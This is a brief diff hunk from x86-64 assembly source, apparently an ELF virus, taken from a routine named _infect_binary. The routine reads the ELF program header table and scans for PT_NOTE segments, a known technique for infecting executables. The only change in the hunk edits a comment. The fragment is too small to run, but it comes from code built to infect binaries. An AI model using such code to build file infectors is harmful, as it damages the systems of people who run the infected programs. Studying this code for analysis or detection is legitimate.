@@ -261,7 +261,7 @@ _infect_binary:
     movzx   rdx, word [rbx + 0x38]      ; e_phnum
     mov	    rcx, qword [rbx  + 0x20]    ; e_phoff
     add     rbx, rcx
-    mov     rax, 0x4                    ; PT_NOTE with PF_X PF_R flag
+    mov     rax, 0x4                    ; PT_NOTE
 
 .segment:
     cmp     rdx, 0
